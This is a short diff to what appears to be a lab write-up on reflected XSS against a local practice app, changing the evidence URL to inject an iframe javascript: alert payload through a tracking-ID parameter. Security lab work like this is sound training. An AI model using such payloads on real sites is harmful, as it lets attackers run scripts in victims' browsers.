@@ -74,7 +74,7 @@ Perform a reflected XSS attack
 ## Evidence (Screenshot)
 
 ```text
-URL: http://127.0.0.1:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+URL: http://127.0.0.1:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
 Payload executed: ✅
 Browser alert: "xss"
 ```
